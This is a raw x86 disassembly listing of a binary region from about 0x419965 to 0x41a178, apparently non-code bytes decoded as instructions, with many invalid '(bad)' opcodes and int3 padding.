  419965:	jmp    0x419939
  419967:	mov    bh,0xbd
  419969:	inc    ebx
  41996a:	ins    BYTE PTR es:[edi],dx
  41996b:	mov    dl,0xd7
  41996d:	add    BYTE PTR [ebp+0x6c],ch
  419970:	mov    al,ds:0x4f72cb40
  419975:	mov    ebp,0xffff2ab8
  41997a:	and    DWORD PTR [edx-0x1],esi
  41997d:	(bad)  
  41997e:	js     0x4199a6
  419980:	(bad)  
  419981:	jmp    FWORD PTR [eax]
  419983:	jmp    0xbd629b8e
  419988:	into   
  419989:	(bad)  
  41998a:	and    eax,0xadd42c88
  41998f:	add    al,0x25
  419991:	xlat   BYTE PTR ds:[ebx]
  419992:	ds jnp 0x41994b
  419995:	xchg   DWORD PTR [ecx+0xa],esp
  419998:	imul   esp,ebx,0x5bcbffff
  41999e:	dec    ecx
  4199a0:	(bad)  
  4199a1:	(bad)  
  4199a2:	call   DWORD PTR [eax-0x36]
  4199a5:	mov    edx,0x6c5724f9
  4199aa:	add    bh,bl
  4199ac:	mov    esp,0xe555d5ec
  4199b1:	mov    cs,WORD PTR [edi]
  4199b3:	sbb    al,0x75
  4199b5:	mov    bh,0xbe
  4199b7:	xchg   esp,eax
  4199b8:	mov    esp,0xb1a72691
  4199bd:	adc    eax,0x3bbf0ab8
  4199c2:	out    0x65,eax
  4199c4:	ds stos BYTE PTR es:[edi],al
  4199c6:	(bad)  
  4199c7:	(bad)  
  4199c8:	std    
  4199c9:	out    0xff,eax
  4199cb:	(bad)  
  4199cc:	inc    DWORD PTR [eax]
	...
  4199d6:	xchg   BYTE PTR [edx],bl
  4199d8:	mov    edx,0x8b8b8b8b
  4199dd:	mov    ecx,DWORD PTR [ebx+0x8b8b8b]
  4199e3:	add    BYTE PTR [eax+0x23b305a],dh
  4199e9:	jmp    0x411dd197
  4199ee:	inc    eax
  4199ef:	bnd jge 0x419a25
  4199f2:	rcr    DWORD PTR [eax+eax*1],0x19
  4199f6:	pop    edi
  4199f7:	add    BYTE PTR [ecx+0x50fe9b],ch
  4199fd:	add    BYTE PTR [esi],dl
  4199ff:	pop    esi
  419a00:	mov    al,ds:0x9685fb01
  419a05:	inc    esi
  419a06:	push   es
  419a07:	mov    bl,0xe1
  419a09:	push   0xbdcf1a45
  419a0e:	gs inc ebx
  419a10:	out    0xb6,al
  419a12:	and    al,0xf2
  419a14:	cdq    
  419a15:	mov    ah,0xd4
  419a17:	dec    esp
  419a18:	pop    ecx
  419a19:	or     eax,0x65000006
  419a1e:	and    BYTE PTR [ecx+0x3c],al
  419a21:	gs inc esp
  419a23:	dec    ebp
  419a24:	jb     0x419a8f
  419a26:	jb     0x419a69
  419a28:	imul   esp,DWORD PTR [ebx+0xa],0xd203c6e
  419a2f:	and    ah,BYTE PTR gs:[edx]
  419a32:	gs gs cs popa 
  419a36:	inc    ebx
  419a37:	cmp    al,0x61
  419a39:	gs ja  0x419a78
  419a3c:	inc    ebx
  419a3d:	je     0x419a61
  419a3f:	or     al,BYTE PTR [ecx+0xd]
  419a42:	je     0x419ab7
  419a44:	outs   dx,BYTE PTR gs:[esi]
  419a46:	inc    ecx
  419a47:	outs   dx,WORD PTR ds:[esi]
  419a49:	gs or  eax,0x69684d6d
  419a4f:	arpl   WORD PTR [ebx+0x5d],sp
  419a52:	ja     0x419ac6
  419a54:	cmp    eax,0x43200d73
  419a59:	jbe    0x419a68
  419a5b:	and    esi,DWORD PTR [edx+0x72]
  419a5e:	and    ah,BYTE PTR [ebp+0x74]
  419a61:	jae    0x419a91
  419a63:	outs   dx,DWORD PTR ds:[esi]
  419a64:	arpl   WORD PTR gs:[edi+0x6f],dx
  419a68:	inc    ecx
  419a69:	and    BYTE PTR [esi],bh
  419a6b:	ins    BYTE PTR es:[edi],dx
  419a6c:	and    BYTE PTR [di+0x2e],ch
  419a70:	ja     0x419ae1
  419a72:	outs   dx,BYTE PTR ds:[esi]
  419a73:	das    
  419a74:	cs gs cs ins BYTE PTR es:[edi],dx
  419a78:	ins    DWORD PTR es:[edi],dx
  419a79:	and    BYTE PTR [esi],bh
  419a7b:	jns    0x419ad4
  419a7d:	je     0x419abb
  419a7f:	ins    DWORD PTR es:[edi],dx
  419a80:	cs imul ebp,DWORD PTR gs:[edi+0x72],0x20654d65
  419a89:	or     ah,BYTE PTR [ebx+0xd]
  419a8c:	or     eax,0xf64e766d
  419a91:	inc    ebp
  419a92:	add    BYTE PTR [eax],al
  419a94:	ins    BYTE PTR es:[edi],dx
  419a95:	mov    cl,0xab
  419a97:	add    BYTE PTR [eax],al
  419a99:	jb     0x419acf
  419a9b:	xor    dh,BYTE PTR [edx+esi*8]
  419a9e:	sbb    BYTE PTR [ebx],0x9e
  419aa1:	repnz cmp edi,DWORD PTR [ebx-0x57]
  419aa5:	std    
  419aa6:	ss call 0x9317:0x5d681fff
  419aae:	mov    dh,BYTE PTR [eax-0x6f]
  419ab1:	add    BYTE PTR [eax],al
  419ab3:	add    BYTE PTR [ecx-0x45ffff6a],dl
  419ab9:	xchg   esp,eax
	...
  419ac6:	(bad)  
  419ac7:	icebp  
  419ac8:	jo     0x419a86
  419aca:	add    BYTE PTR [edx],al
  419acc:	std    
  419acd:	push   esp
  419ace:	stc    
  419acf:	call   0x6154:0xa35736c8
  419ad6:	mov    bl,al
  419ad8:	shl    BYTE PTR [esp+eax*8],cl
  419adb:	push   esp
  419adc:	pop    ebx
  419add:	cdq    
	...
  419ae6:	add    BYTE PTR [eax],al
  419ae8:	add    ch,dl
  419aea:	fiadd  DWORD PTR [edx-0x44]
  419aed:	add    BYTE PTR [eax],al
  419aef:	sbb    dh,BYTE PTR [edx+edi*1+0x486d4d55]
  419af6:	in     al,0xc4
  419af8:	inc    ecx
  419af9:	popf   
  419afa:	or     eax,DWORD PTR [ebp-0x18]
  419afd:	mov    edx,0xf0fae03e
  419b02:	lods   eax,DWORD PTR ds:[esi]
  419b03:	aad    0x2a
  419b05:	ins    DWORD PTR es:[edi],dx
  419b06:	scas   al,BYTE PTR es:[edi]
  419b07:	jl     0x419b19
  419b09:	hlt    
  419b0a:	and    eax,0xa154ee2f
  419b0f:	int3   
  419b10:	push   ds
  419b11:	data16 add BYTE PTR [eax],al
  419b14:	xor    al,0xb5
  419b16:	add    BYTE PTR [eax],al
  419b18:	jb     0x419ab6
  419b1a:	pop    ds
  419b1b:	add    BYTE PTR [eax],al
  419b1d:	js     0x419afa
  419b1f:	lahf   
  419b20:	xor    DWORD PTR [esi],ebp
  419b22:	mov    ch,0x6a
  419b24:	enter  0xf7b4,0xd4
  419b28:	push   eax
  419b29:	enter  0xf738,0x0
  419b2d:	adc    al,0xa3
  419b2f:	sub    ah,BYTE PTR [edx]
  419b31:	sbb    esi,esp
  419b33:	jnp    0x419b60
  419b35:	add    BYTE PTR [eax],al
  419b37:	add    BYTE PTR [eax+0x8eba067],ah
  419b3d:	push   es
  419b3e:	shl    BYTE PTR [ebx-0x77c2d534],0xc7
  419b45:	push   cs
  419b46:	add    BYTE PTR [edx+0x4932e14c],cl
  419b4c:	cli    
  419b4d:	inc    edi
  419b4e:	addr16 pop edx
  419b50:	mov    edx,esi
  419b52:	adc    al,0xe9
  419b54:	mov    ebx,0x57bf0000
  419b59:	push   ecx
  419b5a:	add    BYTE PTR [eax],al
  419b5c:	add    BYTE PTR [ebp-0x7a7a7a7b],al
  419b62:	test   DWORD PTR [ebp+0x678a8585],eax
  419b68:	das    
	...
  419b71:	add    BYTE PTR [ebx-0x686f6b75],cl
  419b77:	mov    BYTE PTR fs:[edi+0x5c80d5f6],ah
  419b7e:	(bad)  
  419b7f:	loop   0x419be6
  419b81:	loop   0x419b43
  419b83:	mov    ds:0x488aa702,al
  419b88:	xor    dl,ah
  419b8a:	and    BYTE PTR [edi],cl
  419b8c:	mov    ecx,DWORD PTR [ebx-0x747472be]
  419b92:	xor    eax,0x38b8ba0
  419b97:	push   cs
  419b98:	and    ch,BYTE PTR [esi]
  419b9a:	repz push edx
  419b9c:	data16 in al,dx
  419b9e:	arpl   WORD PTR [ebp-0x6],sp
  419ba1:	call   FWORD PTR [eax+0x5b7ad88a]
  419ba7:	mov    edx,0x8d6f9851
  419bac:	enter  0x8b22,0x0
  419bb0:	shr    DWORD PTR [esi+0x9a9c],0x0
  419bb7:	jle    0x419bbe
  419bb9:	test   eax,0xee8d25db
  419bbe:	icebp  
  419bbf:	mov    DWORD PTR [esi+0x384656b5],esp
  419bc5:	clc    
  419bc6:	cdq    
  419bc7:	dec    eax
  419bc8:	add    DWORD PTR [ebp+0x785e3d4],ebx
  419bce:	out    0xb1,al
  419bd0:	sbb    al,0xa1
  419bd2:	and    eax,0xf380314a
  419bd7:	retf   
  419bd8:	bound  esi,QWORD PTR [esi]
  419bda:	add    BYTE PTR [eax],al
  419bdc:	cmp    eax,0x94
  419be1:	je     0x419c57
  419be3:	je     0x419c59
  419be5:	je     0x419c5b
  419be7:	je     0x419c5d
  419be9:	je     0x419c60
  419beb:	mov    WORD PTR [edx-0x34],fs
  419bee:	int3   
  419bef:	int3   
  419bf0:	int3   
  419bf1:	int3   
  419bf2:	int3   
  419bf3:	int3   
  419bf4:	int3   
  419bf5:	int3   
  419bf6:	add    BYTE PTR [eax],al
  419bf8:	xchg   ebp,eax
  419bf9:	out    0x37,eax
  419bfb:	(bad)  
  419bfc:	sub    al,0x2f
  419bfe:	mul    BYTE PTR [esi+ebp*1]
  419c01:	xchg   esi,eax
  419c02:	iret   
  419c03:	adc    BYTE PTR [ecx+0x41],dh
  419c06:	xor    al,0xd9
  419c08:	dec    edx
  419c09:	test   eax,0x3a9e3c65
  419c0e:	pop    ebp
  419c0f:	mov    dh,0x0
  419c11:	add    BYTE PTR [eax-0x727bc349],bh
  419c17:	or     DWORD PTR [ebx+0x4b354294],ecx
  419c1d:	and    bh,BYTE PTR [esi+esi*2+0x56ff5c36]
  419c24:	nop
  419c25:	mov    edx,ecx
  419c27:	mov    ebp,0xdcdb7896
  419c2c:	(bad)  
  419c2d:	iret   
  419c2e:	and    BYTE PTR [eax],al
  419c30:	add    BYTE PTR [eax-0x6b],bl
  419c33:	add    eax,DWORD PTR [eax]
  419c35:	add    al,dh
  419c37:	jle    0x419c4e
  419c39:	add    BYTE PTR [eax],al
  419c3b:	add    eax,0x98341eec
  419c40:	out    0xdf,al
  419c42:	pop    esp
  419c43:	jnp    0x419c82
  419c45:	or     al,0xcc
  419c47:	ins    BYTE PTR es:[edi],dx
  419c48:	(bad)  
  419c49:	fld    DWORD PTR [edx-0x20]
  419c4c:	mov    cl,0xbc
  419c4e:	nop
  419c4f:	or     esi,DWORD PTR [edi+0xc760]
  419c55:	add    BYTE PTR [ebx],bl
  419c57:	in     eax,dx
  419c58:	add    BYTE PTR [eax],al
  419c5a:	idiv   dl
  419c5c:	add    BYTE PTR [eax],al
  419c5e:	add    ah,cl
  419c60:	int3   
  419c61:	int3   
  419c62:	int3   
  419c63:	int3   
  419c64:	int3   
  419c65:	int3   
  419c66:	int3   
  419c67:	int3   
  419c68:	icebp  
  419c69:	pop    ecx
  419c6a:	test   eax,0x5ba77d61
  419c6f:	je     0x419c29
  419c71:	sbb    ebx,DWORD PTR ds:0xe7d4fefa
  419c77:	xchg   DWORD PTR [ebp+0x10718e2a],ebx
  419c7d:	pop    bp
  419c7f:	xlat   BYTE PTR ds:[ebx]
  419c80:	(bad)  
  419c81:	(bad)  
  419c82:	(bad)  
  419c83:	(bad)  
  419c84:	(bad)  
  419c85:	(bad)  
  419c86:	(bad)  
  419c87:	(bad)  
  419c88:	inc    DWORD PTR [eax]
  419c8a:	add    ch,dh
  419c8c:	enter  0xca47,0x0
  419c90:	add    BYTE PTR [eax],dl
  419c92:	sub    al,0xe0
  419c94:	and    esi,ebx
  419c96:	sub    ah,al
  419c98:	adc    edx,ebx
  419c9a:	call   0x1e149542
  419c9f:	in     al,dx
  419ca0:	add    dh,ch
  419ca2:	sar    BYTE PTR [eax+ecx*2],1
  419ca5:	pop    edx
  419ca6:	xchg   BYTE PTR [edx],ch
  419ca8:	or     BYTE PTR ds:0x2c2e,cl
  419cad:	hlt    
  419cae:	test   ebp,eax
  419cb0:	dec    esi
  419cb1:	or     ecx,DWORD PTR [edx]
  419cb3:	cmp    al,0x0
  419cb5:	add    BYTE PTR [ebp+0x7c],cl
  419cb8:	add    BYTE PTR [eax],al
  419cba:	loope  0x419c54
  419cbc:	mov    es,WORD PTR [eax]
  419cbe:	mov    DWORD PTR [esi+0x4171d055],edi
  419cc4:	sbb    eax,0xc6ca5ad
  419cc9:	in     eax,dx
  419cca:	add    dl,BYTE PTR [eax]
  419ccc:	pusha  
  419ccd:	es cdq 
  419ccf:	shl    BYTE PTR [edi+eiz*2+0x18],cl
  419cd3:	or     al,0xd8
  419cd5:	popa   
  419cd6:	sbb    ecx,DWORD PTR [ecx+0x5ab78989]
  419cdc:	dec    esi
  419cdd:	arpl   WORD PTR [eax],si
  419cdf:	and    DWORD PTR [edx+ebp*1+0xb],eax
  419ce3:	shr    ebp,1
  419ce5:	shl    DWORD PTR [edx-0x9],0x75
  419ce9:	mov    ds:0x8c40ecc9,eax
  419cee:	or     ebp,DWORD PTR [eax-0x46ec981b]
  419cf4:	dec    ebp
  419cf5:	es pushf 
  419cf7:	mov    DWORD PTR [ecx-0x760b9a81],ecx
  419cfd:	mov    DWORD PTR [ecx-0x17171718],ecx
  419d03:	call   0xe92a85f0
  419d08:	mov    esp,0x7575a21b
  419d0d:	jne    0x419d84
  419d0f:	jne    0x419d86
  419d11:	jne    0x419d88
  419d13:	jne    0x419c9a
  419d15:	test   eax,ecx
  419d17:	cmp    DWORD PTR [edx-0x10bff903],ebx
  419d1d:	mov    esp,0x250d4de2
  419d22:	fs mov bh,0x91
  419d25:	or     al,0x47
  419d27:	cmove  ebx,DWORD PTR [edx-0x1e]
  419d2b:	shl    DWORD PTR [ebx-0x13],0x85
  419d2f:	test   DWORD PTR [eax],eax
  419d31:	or     al,BYTE PTR [ebp-0x7a898e7b]
  419d37:	test   eax,eax
  419d39:	adc    al,0x8e
  419d3b:	jg     0x419cfe
  419d3d:	jnp    0x419cc5
  419d3f:	aaa    
  419d40:	clc    
  419d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d42:	(bad)  
  419d43:	fild   DWORD PTR [ebx+0x7d]
  419d46:	aaa    
  419d47:	sar    DWORD PTR [eax-0x650781fb],0x89
  419d4e:	enter  0x852d,0x0
  419d52:	std    
  419d53:	sahf   
  419d54:	fmul   DWORD PTR [ebx]
  419d56:	add    BYTE PTR [eax],al
  419d58:	add    BYTE PTR ds:0x1ca1d156,ah
  419d5e:	sub    al,0x87
  419d60:	mov    ecx,0xaec1276a
  419d65:	mov    ecx,0xe38d980e
  419d6a:	je     0x419d80
  419d6c:	pop    ds
  419d6d:	sbb    esp,DWORD PTR [ebp-0x6f]
  419d70:	fmul   DWORD PTR [edx]
  419d72:	jge    0x419d7c
  419d74:	sub    al,0x2a
  419d76:	cmp    BYTE PTR [ebx-0x6c27b1a1],bl
  419d7c:	add    BYTE PTR [eax],al
  419d7e:	int    0xfe
	...
  419d8c:	xchg   edx,eax
  419d8d:	push   edx
  419d8e:	cli    
	...
  419d97:	add    BYTE PTR [esp+esi*2+0x27],dh
  419d9b:	fisttp WORD PTR [esi+eax*4+0x43afadc3]
  419da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419da3:	sti    
  419da4:	mov    bh,0xf7
  419da6:	push   eax
  419da7:	mov    bl,0x9e
  419da9:	adc    DWORD PTR [eax+0x79],0xffffffad
  419dad:	test   DWORD PTR [ecx+0x742b9d25],0x46ac9574
  419db7:	stos   DWORD PTR es:[edi],eax
  419db8:	loop   0x419e15
  419dba:	sub    BYTE PTR ds:0x69fc13ed,ch
  419dc0:	jmp    0x419d7a
  419dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dc3:	ins    BYTE PTR es:[edi],dx
  419dc4:	jo     0x419de0
  419dc6:	scas   eax,DWORD PTR es:[edi]
  419dc7:	nop
  419dc8:	fstp   TBYTE PTR [edi-0x23146a3b]
  419dce:	add    eax,0x7474df69
  419dd3:	(bad)  
  419dd4:	icebp  
  419dd5:	and    eax,0x555d7474
  419dda:	dec    eax
  419ddb:	je     0x419de1
  419ddd:	in     al,0xd7
  419ddf:	inc    edi
  419de0:	and    dh,BYTE PTR [esi+0x2e]
  419de3:	dec    ebp
  419de4:	push   edx
  419de5:	and    BYTE PTR [edx+ecx*1+0x2e],dh
  419de9:	push   eax
  419dea:	and    BYTE PTR [edx+0x72],dh
  419ded:	and    BYTE PTR [ebx+0x61],ah
  419df0:	jo     0x419e3f
  419df2:	sub    al,0x6d
  419df4:	outs   dx,BYTE PTR ds:[esi]
  419df5:	cs ins DWORD PTR es:[edi],dx
  419df7:	and    ah,BYTE PTR [ebp+0x53]
  419dfa:	jb     0x419e5f
  419dfc:	ins    DWORD PTR es:[edi],dx
  419dfd:	jae    0x419e52
  419dff:	outs   dx,DWORD PTR ds:[esi]
  419e00:	imul   ebp,DWORD PTR [ecx+eax*2],0x2e656d65
  419e07:	gs cs jae 0x419e74
  419e0b:	je     0x419e2d
  419e0d:	and    BYTE PTR [edi+0x74],ch
  419e10:	jae    0x419e79
  419e12:	jae    0x419e86
  419e14:	data16 and BYTE PTR [ecx*2+0x61742073],bh
  419e1c:	inc    ecx
  419e1d:	imul   ebp,DWORD PTR [eax+0x65],0x4443206d
  419e24:	js     0x419e93
  419e26:	and    BYTE PTR [ebx+0x70],dh
  419e29:	js     0x419e90
  419e2b:	or     ch,BYTE PTR [ebp+0x2e]
  419e2e:	and    ch,BYTE PTR [edi+0x20]
  419e31:	jo     0x419ea5
  419e33:	arpl   WORD PTR [eax+0x65],si
  419e36:	push   ebx
  419e37:	and    BYTE PTR [ebp+0x2e],ah
  419e3a:	push   edx
  419e3b:	inc    ecx
  419e3c:	push   ebx
  419e3d:	outs   dx,BYTE PTR ds:[esi]
  419e3e:	or     eax,0x65626562
  419e43:	jo     0x419eb2
  419e45:	outs   dx,BYTE PTR ds:[esi]
  419e46:	or     eax,0x6f202070
  419e4b:	and    BYTE PTR [ebx+0x2e],dh
  419e4e:	bound  esp,QWORD PTR [ebx+0x2c]
  419e51:	jo     0x419ec2
  419e53:	push   ebx
  419e54:	imul   esi,DWORD PTR [ebx-0x25],0x7b
  419e58:	adc    al,0xb1
  419e5a:	jp     0x419e0e
  419e5c:	add    eax,0x62266a3b
  419e61:	xchg   dh,bh
  419e63:	jbe    0x419ebc
  419e65:	xor    DWORD PTR [ecx],ecx
  419e67:	fild   DWORD PTR [ebx+0x58]
  419e6a:	mov    eax,ds:0x20040404
  419e6f:	xchg   ebx,eax
  419e70:	add    al,0x4
  419e72:	jo     0x419e2b
  419e74:	add    al,0x4
  419e76:	add    al,0x0
	...
  419e80:	call   0x9dcf6734
  419e85:	call   0x511640ea
  419e8a:	lods   al,BYTE PTR ds:[esi]
  419e8b:	int    0x0
  419e8d:	jns    0x419ec2
  419e8f:	sbb    eax,0xf88fc65
  419e94:	dec    eax
  419e95:	push   ss
  419e96:	lods   eax,DWORD PTR ds:[esi]
  419e97:	jnp    0x419e65
  419e99:	int3   
  419e9a:	int3   
  419e9b:	int3   
  419e9c:	int3   
  419e9d:	int3   
  419e9e:	int3   
  419e9f:	int3   
  419ea0:	int3   
  419ea1:	add    BYTE PTR [eax],al
  419ea3:	mov    esp,0x98a6d4
  419ea8:	add    BYTE PTR [ebx],al
  419eaa:	xchg   DWORD PTR [esi+0x2],edi
  419ead:	mov    edx,0xc8580cd0
  419eb2:	cmp    eax,0x52e992d3
  419eb7:	sbb    BYTE PTR [ebx-0x5f],bh
  419eba:	mov    bl,0xea
  419ebc:	(bad)  
  419ebd:	mov    cl,0x1d
  419ebf:	jmp    0xc6b3:0x968fa8af
  419ec6:	cmp    al,0x8
  419ec8:	mov    eax,ds:0x734927
  419ecd:	add    BYTE PTR [eax+0x57],al
  419ed0:	add    BYTE PTR [eax],al
  419ed2:	fld    QWORD PTR [eax+eax*1+0xd978b00]
  419ed9:	gs dec ebp
  419edb:	sbb    eax,0x76bcf0ab
  419ee0:	aad    0x78
  419ee2:	sub    al,BYTE PTR [ebx+0x18]
  419ee5:	int3   
  419ee6:	cmp    DWORD PTR [eax-0x70],esp
  419ee9:	adc    DWORD PTR [ebp+0x51],ebp
  419eec:	mov    cl,0xdf
  419eee:	(bad)  
  419eef:	mov    ecx,DWORD PTR [ebx+0x6a9c4b8b]
  419ef5:	imul   edi,DWORD PTR [edi-0x567c207d],0xce2cbe11
  419eff:	jmp    0x9230cfba
  419f04:	mov    esp,0xb6525fec
  419f09:	sub    ch,dl
  419f0b:	push   eax
  419f0c:	int    0x78
  419f0e:	aad    0x8b
  419f10:	mov    ebx,DWORD PTR [ebx-0xd]
  419f13:	inc    ecx
  419f14:	mov    ecx,DWORD PTR [ebx-0x17171775]
  419f1a:	call   0xe92a8807
  419f1f:	call   0xc4d0f28
  419f24:	or     al,0xc
  419f26:	or     al,0xc
  419f28:	or     al,0xc
  419f2a:	or     al,0xc
  419f2c:	add    BYTE PTR [eax],al
  419f2e:	repnz sbb DWORD PTR [ebx-0x48],0xffffff8e
  419f33:	shr    BYTE PTR [edx+0x49],0x60
  419f37:	mov    edx,0x75f5834d
  419f3c:	mov    BYTE PTR [ebx+0x38],al
  419f3f:	mov    edx,DWORD PTR [ebx-0x5e]
  419f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f43:	or     DWORD PTR [eax+0x3e000074],0x90000c7
  419f4d:	pushf  
  419f4e:	add    BYTE PTR [eax],al
  419f50:	loope  0x419f4b
  419f52:	(bad)  
  419f53:	push   ebx
  419f54:	or     al,BYTE PTR [edx+0x5e]
  419f57:	dec    esi
  419f58:	adc    BYTE PTR [esi],ch
  419f5a:	call   0xef2191f9
  419f5f:	cmp    edx,esp
  419f61:	push   esp
  419f62:	pop    ss
  419f63:	ins    DWORD PTR es:[edi],dx
  419f64:	push   ebp
  419f65:	data16 adc al,0x8e
  419f68:	add    al,al
  419f6a:	(bad)  
  419f6c:	jmp    0xc1025f72
  419f71:	adc    dl,BYTE PTR [edx+0x34a501b2]
  419f77:	lods   eax,DWORD PTR ds:[esi]
  419f78:	or     DWORD PTR [ebx+0x15],ecx
  419f7b:	aad    0xa7
  419f7d:	imul   esi,DWORD PTR [ecx-0x6fd4bfc0],0xbbc99a4d
  419f87:	in     al,0x33
  419f89:	xor    eax,0x3d642986
  419f8e:	(bad)  
  419f8f:	rcr    ch,cl
  419f91:	sub    BYTE PTR [edi+ebx*2-0x40],ch
  419f95:	rcl    dl,0x4f
  419f98:	rol    al,0xc0
	...
  419fa3:	add    dl,dh
  419fa5:	inc    edi
  419fa6:	int3   
  419fa7:	mov    ecx,DWORD PTR [ebx-0x74747475]
  419fad:	mov    ecx,DWORD PTR [ebx-0x3bffff75]
  419fb3:	(bad)  
  419fb4:	scas   al,BYTE PTR es:[edi]
  419fb5:	cmp    dh,BYTE PTR [edx-0x8]
  419fb8:	cld    
  419fb9:	jp     0x419f87
  419fbb:	call   0x7d3e9e4a
  419fc0:	mov    cl,0x41
  419fc2:	sahf   
  419fc3:	imul   esp
  419fc5:	icebp  
  419fc6:	stos   DWORD PTR es:[edi],eax
  419fc7:	imul   eax,DWORD PTR [eax+eiz*2+0x0],0xa6234000
  419fcf:	sub    BYTE PTR [edi],dh
  419fd1:	repz scas eax,DWORD PTR es:[edi]
  419fd3:	in     al,0xd
  419fd5:	adc    ah,BYTE PTR [ebx-0x6add8905]
  419fdb:	(bad)  
  419fdc:	and    al,0xe0
  419fde:	icebp  
  419fdf:	jnp    0x419fb7
  419fe1:	cs loopne 0x419faa
  419fe4:	out    dx,eax
  419fe5:	xchg   DWORD PTR [ebx+edi*1-0xbffff86],ecx
  419fec:	fwait
  419fed:	fwait
  419fee:	add    BYTE PTR [eax],al
  419ff0:	add    eax,DWORD PTR [edx-0x18f3ff73]
  419ff6:	jecxz  0x41a050
  419ff8:	inc    ebp
  419ff9:	retf   0x1bab
  419ffc:	enter  0xab46,0x76
  41a000:	hlt    
  41a001:	cwde   
  41a002:	(bad)  
  41a004:	loop   0x419f9d
  41a006:	data16 sbb BYTE PTR [edx-0x29],0x71
  41a00b:	retf   
  41a00c:	test   al,0xc
  41a00e:	or     al,0xc
  41a010:	push   ds
  41a011:	pop    edx
  41a012:	or     al,0xc
  41a014:	or     al,0xb7
  41a016:	or     al,0xc
  41a018:	or     al,0x89
  41a01a:	mov    DWORD PTR [ecx-0x76767677],ecx
  41a020:	mov    DWORD PTR [ecx+0x7bf1e860],ecx
  41a026:	fisttp QWORD PTR [edi+0x54485b54]
  41a02c:	or     al,0xb7
  41a02e:	jge    0x41a017
  41a030:	test   eax,0x25ddc890
  41a035:	iret   
  41a036:	xchg   DWORD PTR [edi-0x7474a8f5],esi
  41a03c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  41a042:	mov    eax,DWORD PTR [ebx+0x62472d83]
  41a048:	mov    al,BYTE PTR [ebx-0xb60f7d]
  41a04e:	inc    eax
  41a04f:	sahf   
  41a050:	mov    ebx,0xd9d5a3dd
  41a055:	add    eax,0xa2cdd9b4
  41a05a:	outs   dx,DWORD PTR ds:[esi]
  41a05b:	repz stc 
  41a05d:	scas   al,BYTE PTR es:[edi]
  41a05e:	in     al,dx
  41a05f:	mov    edi,0xfec0540c
  41a064:	mov    edx,0xc751d8b9
  41a069:	cmc    
  41a06a:	inc    ebx
  41a06b:	je     0x41a00d
  41a06d:	test   al,0x83
  41a06f:	sub    DWORD PTR [esi+0xd],0xffffff83
  41a073:	xor    ecx,0xffffffd3
  41a076:	cld    
  41a077:	add    DWORD PTR [eax],0xffffffb1
  41a07a:	lods   eax,DWORD PTR ds:[esi]
  41a07b:	ret    
  41a07c:	or     bh,BYTE PTR [esi-0x7]
  41a07f:	fnsave [esi]
  41a081:	jns    0x41a0d7
  41a083:	or     al,ch
  41a085:	nop
  41a086:	aad    0xbb
  41a088:	pop    edx
  41a089:	pop    ecx
  41a08a:	sbb    eax,DWORD PTR [ebp-0x5e]
  41a08d:	mov    edi,0x168283
  41a092:	add    BYTE PTR [eax],al
  41a094:	sub    DWORD PTR [ebp+0x53],ecx
  41a097:	xchg   esp,eax
  41a098:	into   
  41a099:	cmp    BYTE PTR [ebp+0x3d443826],al
  41a09f:	ja     0x41a0c4
  41a0a1:	ret    0xd440
  41a0a4:	mov    edx,0xcf2ba012
  41a0a9:	fs pop edi
  41a0ac:	mov    dh,0xb2
  41a0ae:	xor    DWORD PTR [edx+ebx*8-0x36c10000],eax
  41a0b5:	mov    ch,0x0
  41a0b7:	add    BYTE PTR [eax],al
  41a0b9:	jne    0x41a130
  41a0bb:	jne    0x41a132
  41a0bd:	jne    0x41a134
  41a0bf:	jne    0x41a136
  41a0c1:	jne    0x41a0fd
  41a0c3:	sbb    dl,BYTE PTR [edx+0x0]
	...
  41a0ce:	add    BYTE PTR [eax],al
  41a0d0:	mov    dh,0x81
  41a0d2:	xchg   edi,eax
  41a0d3:	push   esi
  41a0d4:	(bad)  
  41a0d6:	shl    BYTE PTR [eax-0x74],0xdd
  41a0da:	jecxz  0x41a0da
  41a0dc:	leave  
  41a0dd:	in     eax,dx
  41a0de:	push   eax
  41a0df:	sbb    eax,0x11d86f33
  41a0e4:	and    eax,0xeb7b3b
  41a0e9:	add    BYTE PTR [edx],bl
  41a0eb:	hlt    
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	fbstp  TBYTE PTR [edx+0x5d210000]
  41a0f4:	cmp    eax,0x44378e17
  41a0f9:	sti    
  41a0fa:	loopne 0x41a171
  41a0fc:	mov    ds:0x69a6ece0,eax
  41a101:	daa    
  41a102:	addr16 ret 
  41a104:	mov    ss,WORD PTR [esi]
  41a106:	pop    eax
  41a107:	outs   dx,BYTE PTR ds:[esi]
  41a108:	lds    ebp,FWORD PTR [ebp+0x0]
  41a10b:	add    BYTE PTR [ecx+0xd3d72],dl
  41a111:	add    BYTE PTR [eax],al
  41a113:	mov    dh,0x75
  41a115:	push   edi
  41a116:	push   0xffffff97
  41a118:	mov    ch,0xbc
  41a11a:	sbb    DWORD PTR [eax-0xc965592],esp
  41a120:	fcomip st,st(2)
  41a122:	outs   dx,DWORD PTR ds:[esi]
  41a123:	and    al,BYTE PTR [ebp-0x80]
  41a126:	cmc    
  41a127:	jb     0x41a15a
  41a129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a12a:	inc    esi
  41a12b:	ficomp WORD PTR [esi-0x606361b2]
  41a131:	inc    esp
  41a132:	jle    0x41a154
  41a134:	aaa    
  41a135:	hlt    
  41a136:	add    BYTE PTR [eax],al
  41a138:	inc    edx
  41a139:	jbe    0x41a13b
  41a13b:	add    BYTE PTR [eax],al
  41a13d:	mov    DWORD PTR [ecx-0x76767677],ecx
  41a143:	mov    DWORD PTR [ecx-0x4fca3477],ecx
  41a149:	mov    DWORD PTR [ecx-0x76767677],ecx
  41a14f:	mov    DWORD PTR [ecx+0x74505089],ecx
  41a155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a156:	shl    BYTE PTR [edi-0x516a6899],1
  41a15c:	nop
  41a15d:	shr    DWORD PTR [ebp-0x5e],0x9d
  41a161:	add    BYTE PTR [ebx+0xd],0x89
  41a165:	je     0x41a1db
  41a167:	inc    edx
  41a168:	ins    BYTE PTR es:[edi],dx
  41a169:	ds sub eax,0xca505080
  41a16f:	and    eax,0x6b7aa0a2
  41a174:	out    dx,al
  41a175:	or     BYTE PTR [ecx],0xbe
  41a178:	sub    DWORD PTR [eax-0xf3fe206],ecx
